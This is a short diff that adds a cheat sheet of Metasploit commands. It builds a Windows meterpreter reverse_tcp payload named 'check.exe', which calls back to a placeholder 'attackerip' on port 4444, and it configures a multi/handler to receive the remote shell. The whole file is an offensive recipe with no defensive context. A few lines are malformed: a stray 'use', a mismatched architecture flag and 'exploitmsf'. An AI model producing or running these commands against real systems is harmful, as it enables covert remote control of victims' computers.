@@ -1,0 +1,10 @@
+service postgresql start
+use 
+msfvenom -p windows/meterpreter/reverse_tcp -a x86_64 --platform windows LHOST=attackerip LPORT=4444 -f exe > check.exe
+
+msfconsole
+	use exploit/multi/handler
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	set LHOST attackerip
+	set LPORT 4444
+	exploitmsf
